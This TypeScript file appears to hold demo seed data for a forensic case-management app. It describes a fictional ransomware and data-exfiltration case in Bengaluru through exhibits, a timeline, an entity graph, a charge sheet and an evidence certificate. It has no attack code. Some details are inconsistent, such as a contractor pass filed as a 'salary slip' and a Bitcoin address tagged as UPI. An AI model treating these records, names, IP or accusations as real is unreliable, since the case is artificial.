    exhibit_code: 'EXH-05',
    artifact_type: 'MEDIA',
    file_path: 'Case_2_Corporate_Ransomware_and_Data_Exfiltration/05_tampered_salary_slip_evidence.jpg',
    file_size: 54974,
    raw_sha256: 'cacdfc8a38dc978164186f4e9c205afd444ba8cc264c4b7237d683af1f5f6872',
    sha256_salted: 'e748192a3bb408192847a9821034f8291038471928471d84e11029c784fa9201',
    created_at: '2026-03-15T14:30:00Z',
    forgery_score: 91.5,
    forensic_summary: '🚨 CRITICAL FORGERY DETECTED (91.5%): Counterfeit insider contractor badge and authorization voucher submitted by suspect to gain physical server room access.',
    extracted_text_preview: 'Contractor Authorization Pass\nVendor: CloudSys Infrastructure Partners\nAuthorized Scope: Level 3 Server Hall Maintenance\nSignature: Forged digital signature of VP Infrastructure',
    entities: [
      { type: 'ORG', value: 'CloudSys Infrastructure' },
      { type: 'DATE', value: '15 Mar 2026' }
    ],
    forgery_details: {
      tamper_score: 91.5,
      summary: 'GIMP digital paintbrush alterations detected across security hologram badge zone.',
      ela_image_file: 'Case_2_Corporate_Ransomware_and_Data_Exfiltration/05_tampered_salary_slip_evidence.jpg'
    },
    metadata: {
      software: 'GIMP 2.10.34',
      resolution: '800x1200'
    }
  },
  {
    id: 206,
    case_id: 2,
    name: '06_server_room_raid_photo.jpg',
    exhibit_code: 'EXH-06',
    artifact_type: 'MEDIA',
    file_path: 'Case_2_Corporate_Ransomware_and_Data_Exfiltration/06_server_room_raid_photo.jpg',
    file_size: 116983,
    raw_sha256: '10d34ff4640a905fed24968af84de577207e497df985e00778c6f3452a8f1508',
    sha256_salted: '8204f195827361a9928371628495021772b918cae491209cc542e8174092b3a8',
    created_at: '2026-03-15T16:00:00Z',
    forgery_score: 4.5,
    forensic_summary: '✅ AUTHENTIC SEIZURE PHOTO: Physical seizure of rogue hardware tap implant connected to rack 14 switch port in Electronic City data centre.',
    extracted_text_preview: 'PHYSICAL HARDWARE SEIZURE\nLocation: PayVance Data Centre, Electronic City Phase 1, Bengaluru\nSeized Item: Raspberry Pi 4 USB rogue ethernet bridge tap\nOfficer: DySP N. Rao (Karnataka CID Cyber)',
    entities: [
      { type: 'GPE', value: 'Electronic City, Bengaluru, Karnataka' },
      { type: 'DATE', value: '15 Mar 2026' }
    ],
    forgery_details: {
      tamper_score: 4.5,
      summary: 'Authentic camera optics and uniform sensor noise.',
      ela_image_file: 'Case_2_Corporate_Ransomware_and_Data_Exfiltration/06_server_room_raid_photo.jpg'
    },
    metadata: {
      camera: 'Nikon D780',
      gps_lat: 12.8399,
      gps_lon: 77.6770,
      location_name: 'Electronic City, Bengaluru, Karnataka, India'
    }
  }
];

export const DEFAULT_CASE2_TIMELINE = [
  {
    id: 1,
    timestamp: '2026-03-15T00:30:00Z',
    event_type: 'PHYSICAL_INTRUSION',
    description: 'Contractor uses forged physical pass to access Level 3 server hall at Electronic City.',
    actor: 'Rogue Contractor (CloudSys)',
    target: 'PayVance Server Hall Rack 14',
    severity: 'CRITICAL',
    is_anomaly: true,
    source: 'CCTV & Biometric Access Logs'
  },
  {
    id: 2,
    timestamp: '2026-03-15T01:14:00Z',
    event_type: 'NETWORK_EXFILTRATION',
    description: 'CloudTrail registers unauthorized mass S3 GetObject requests from Russian IP 194.26.29.112.',
    actor: '194.26.29.112',
    target: 's3://payvance-prod-kyc/',
    severity: 'CRITICAL',
    is_anomaly: true,
    source: 'AWS CloudTrail'
  },
  {
    id: 3,
    timestamp: '2026-03-15T04:00:00Z',
    event_type: 'STATUTORY_FILING',
    description: 'Mandatory 6-hour cybersecurity breach report filed with CERT-In under IT Rule 12.',
    actor: 'Arjun Menon (CISO)',
    target: 'CERT-In National Incident Response',
    severity: 'INFO',
    is_anomaly: false,
    source: 'CERT-In Portal Register'
  },
  {
    id: 4,
    timestamp: '2026-03-15T06:30:00Z',
    event_type: 'EXTORTION_DEMAND',
    description: 'Ransomware operator contacts leadership on Telegram demanding 5 BTC under threat of data leak.',
    actor: '@CipherPhantom',
    target: 'PayVance Incident Response Team',
    severity: 'CRITICAL',
    is_anomaly: true,
    source: 'Telegram Negotiation Transcript'
  },
  {
    id: 5,
    timestamp: '2026-03-15T15:30:00Z',
    event_type: 'POLICE_RAID',
    description: 'Karnataka CID Cyber Crime unit raids data center and disconnects rogue packet sniffer.',
    actor: 'Karnataka CID Cyber',
    target: 'Electronic City Server Room',
    severity: 'INFO',
    is_anomaly: false,
    source: 'Seizure Panchnama Memo'
  }
];

export const DEFAULT_CASE2_GRAPH = {
  nodes: [
    { id: 'SUSP_DEV', label: 'Rogue Contractor', type: 'PERSON', color: '#EF4444', size: 26 },
    { id: 'CIPHER_PHANTOM', label: 'CipherPhantom (BlackByte)', type: 'PERSON', color: '#DC2626', size: 24 },
    { id: 'ORG_PAYVANCE', label: 'PayVance Technologies', type: 'ORG', color: '#10B981', size: 24 },
    { id: 'AWS_S3', label: 's3://payvance-prod-kyc', type: 'DATABASE', color: '#06B6D4', size: 22 },
    { id: 'EXFIL_IP', label: '194.26.29.112 (Exfil Server)', type: 'IP', color: '#EC4899', size: 20 },
    { id: 'BTC_ADDR', label: 'bc1qxy2kgdyg...wlh (Ransom VPA)', type: 'UPI', color: '#F59E0B', size: 20 }
  ],
  edges: [
    { source: 'SUSP_DEV', target: 'AWS_S3', relation: 'EXFILTRATED_CREDENTIALS', confidence: 0.98 },
    { source: 'EXFIL_IP', target: 'AWS_S3', relation: 'MASS_DOWNLOAD', confidence: 0.96 },
    { source: 'CIPHER_PHANTOM', target: 'BTC_ADDR', relation: 'DEMANDS_RANSOM_TO', confidence: 0.99 },
    { source: 'CIPHER_PHANTOM', target: 'ORG_PAYVANCE', relation: 'EXTORTS', confidence: 0.97 }
  ],
  summary: {
    total_nodes: 6,
    total_edges: 4,
    case_nodes: 2,
    exhibit_nodes: 2,
    entity_nodes: 2
  }
};

export const DEFAULT_CASE2_HYPOTHESES = [
  {
    id: 1,
    title: 'Insider Credential Siphoning & Ransomware Double-Extortion',
    status: 'APPROVED',
    description: 'Physical server access was gained using an altered subcontractor badge to implant a packet sniffer, capturing AWS IAM production credentials.',
    modus_operandi: 'Physical implant -> Cloud credential harvesting -> Mass S3 data staging -> Darknet extortion demand.',
    supporting_evidence: [
      'Seized Raspberry Pi hardware bridge attached to Rack 14',
      'AWS CloudTrail confirms IAM key usage from offshore IP within 2 hours of implant',
      'GIMP manipulation detected on contractor pass EXH-05'
    ],
    counter_arguments: 'Contractor claimed the Raspberry Pi was an authorized network diagnostic analyzer.',
    contradictions: [
      'No ticket or change-request authorized any diagnostic implant on Rack 14'
    ],
    confidence_score: 95
  }
];

export const DEFAULT_CASE2_CHARGESHEET = {
  court_name: 'IN THE COURT OF 1ST ADDITIONAL CHIEF METROPOLITAN MAGISTRATE, BENGALURU',
  fir_number: 'INC-2026-518',
  fir_date: '15/03/2026',
  police_station: 'Cyber Crime Police Station, CID Headquarters, Carlton House, Bengaluru',
  statutory_provisions: [
    'Section 308(2) Bharatiya Nyaya Sanhita, 2023 (Extortion)',
    'Section 316(2) Bharatiya Nyaya Sanhita, 2023 (Criminal Breach of Trust by Corporate Contractor)',
    'Section 43/66 Information Technology Act, 2000 (Data Damage & System Disruption)',
    'Section 66F Information Technology Act, 2000 (Cyber Terrorism)',
    'Section 63 Bharatiya Sakshya Adhiniyam, 2023 (Admissibility of Digital Logs)'
  ],
  complainant: {
    name: 'Arjun Menon, Chief Information Security Officer',
    contact: '+91 80 4920 1800',
    address: 'PayVance Technologies Campus, Electronic City, Bengaluru',
    loss_amount: 'Demanded 5 BTC (~Rs. 3.25 Crores)'
  },
  accused: {
    name: 'CipherPhantom / Operative at CloudSys Contractor',
    phone: 'Telegram handle @CipherPhantom',
    upi_beneficiary: 'bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh',
    origin_ip: '194.26.29.112 (Moscow, Russian Federation)',
    arrest_status: 'Hardware Seized; Red Corner Notice Pending'
  },
  modus_operandi: 'Rogue contractor abused physical access to implant hardware network bridge, harvested cloud credentials, and coordinated with BlackByte ransomware affiliates for corporate extortion.',
  ai_forensic_findings: 'Hardware serial matches MAC address in server ARP tables. CloudTrail and AWS cryptographic HMAC matches KAPE laptop triage dump.',
  investigating_officer: {
    name: 'DySP N. Rao',
    badge: 'KAR-CID-309',
    station: 'CID Cyber Crime Police Station, Bengaluru'
  }
};

export const DEFAULT_CASE2_BSACERT = {
  certificate_id: 'BSA-2026-KAR-CID-518',
  case_number: 'INC-2026-518',
  case_title: 'Operation BlackByte — Corporate Cloud Ransomware',
  blockchain_verification_network: 'Polygon PoS Mainnet (Contract: 0x8A79F218...3901)',
  part_a_exhibits: [
    {
      exhibit_no: 'EXH-01',
      artifact_name: '01_Incident_Notice_and_Breach_Report.pdf',
      un_salted_sha256: '9412f05946a6212e95a9b73b5b3770aa324ce5018458d4b2e86322db0321cafe',
      file_size_bytes: 5164
    },
    {
      exhibit_no: 'EXH-02',
      artifact_name: '02_telegram_extortion_transcript.txt',
      un_salted_sha256: '9b1ca546fc072d9cd0624d90f7046f13ad32ed0ffeeda09fb0f0afd6f2bc0830',
      file_size_bytes: 1785
    },
    {
      exhibit_no: 'EXH-03',
      artifact_name: '03_cloudtrail_and_auth_logs.csv',
      un_salted_sha256: 'd4f8fc19ee8d19e5c1be315e25d77d6998ff095bc3e1d45b8548ee787959b13e',
      file_size_bytes: 1843
    },
    {
      exhibit_no: 'EXH-04',
      artifact_name: '04_suspect_laptop_triage_dump.sqlite',
      un_salted_sha256: 'a04ee265be8b05578aea7c7170f19faadb5a018eaac75a10cc26cc3c0d29a724',
      file_size_bytes: 20480
    },
    {
      exhibit_no: 'EXH-05',
      artifact_name: '05_tampered_salary_slip_evidence.jpg',
      un_salted_sha256: 'cacdfc8a38dc978164186f4e9c205afd444ba8cc264c4b7237d683af1f5f6872',
      file_size_bytes: 54974
    },
    {
      exhibit_no: 'EXH-06',
      artifact_name: '06_server_room_raid_photo.jpg',
      un_salted_sha256: '10d34ff4640a905fed24968af84de577207e497df985e00778c6f3452a8f1508',
      file_size_bytes: 116983
    }
  ],
  part_b_declaration: 'I, DySP N. Rao, Investigating Officer, Karnataka CID Cyber Crime Division, do hereby certify under Section 63 of the Bharatiya Sakshya Adhiniyam, 2023 (BSA) that the digital logs, CloudTrail streams, and forensic triage images enumerated in Part A maintain full chain of custody and cryptographic hash consistency.',
  officer: {
    name: 'DySP N. Rao',
    role: 'Deputy Superintendent of Police (Cyber Crime)',
    badge: 'KAR-CID-309',
    department: 'Karnataka State Police CID'
  }
};

// Storage helper functions
export function getLocalArtifacts(caseId: string | number): any[] {
  if (typeof window === 'undefined') return [];
  try {
    const raw = localStorage.getItem(`sutram_artifacts_${caseId}`);
    if (raw) return JSON.parse(raw);
  } catch {}
  if (String(caseId) === '1') return DEFAULT_CASE1_ARTIFACTS;
  if (String(caseId) === '2') return DEFAULT_CASE2_ARTIFACTS;
  return [];
}

export function saveLocalArtifact(caseId: string | number, artifact: any): any[] {
  if (typeof window === 'undefined') return [];
  try {
    const existing = getLocalArtifacts(caseId);
    const updated = [artifact, ...existing.filter(a => a.id !== artifact.id)];
    localStorage.setItem(`sutram_artifacts_${caseId}`, JSON.stringify(updated));
    return updated;
  } catch (err) {
    console.error('Error saving local artifact:', err);
    return [];
  }
}

export function getLocalTimeline(caseId: string | number): any[] {
  if (typeof window === 'undefined') return [];
  try {
    const raw = localStorage.getItem(`sutram_timeline_${caseId}`);
    if (raw) return JSON.parse(raw);
  } catch {}
  if (String(caseId) === '1') return DEFAULT_CASE1_TIMELINE;
  if (String(caseId) === '2') return DEFAULT_CASE2_TIMELINE;
  return [];
}

export function getLocalGraph(caseId: string | number): any {
  if (typeof window === 'undefined') return { nodes: [], edges: [] };
  try {
    const raw = localStorage.getItem(`sutram_graph_${caseId}`);
    if (raw) return JSON.parse(raw);
  } catch {}
  if (String(caseId) === '1') return DEFAULT_CASE1_GRAPH;
  if (String(caseId) === '2') return DEFAULT_CASE2_GRAPH;
  return { nodes: [], edges: [] };
}

export function getLocalHypotheses(caseId: string | number): any[] {
  if (typeof window === 'undefined') return [];
  try {
    const raw = localStorage.getItem(`sutram_hypotheses_${caseId}`);
    if (raw) return JSON.parse(raw);
  } catch {}
  if (String(caseId) === '1') return DEFAULT_CASE1_HYPOTHESES;
  if (String(caseId) === '2') return DEFAULT_CASE2_HYPOTHESES;
  return [];
}

export function saveLocalHypothesisReview(caseId: string | number, hypId: number, status: 'APPROVED' | 'REJECTED', notes?: string): any[] {
  if (typeof window === 'undefined') return [];
  try {
    const existing = getLocalHypotheses(caseId);
    const updated = existing.map(h => (h.id === hypId ? { ...h, status, investigator_notes: notes || h.investigator_notes } : h));
    localStorage.setItem(`sutram_hypotheses_${caseId}`, JSON.stringify(updated));
    return updated;
  } catch {
    return [];
  }
}

export function getLocalChargeSheet(caseId: string | number): any {
  if (String(caseId) === '2') return DEFAULT_CASE2_CHARGESHEET;
  return DEFAULT_CASE1_CHARGESHEET;
}

export function getLocalBSACert(caseId: string | number): any {
  if (String(caseId) === '2') return DEFAULT_CASE2_BSACERT;
  return DEFAULT_CASE1_BSACERT;
}
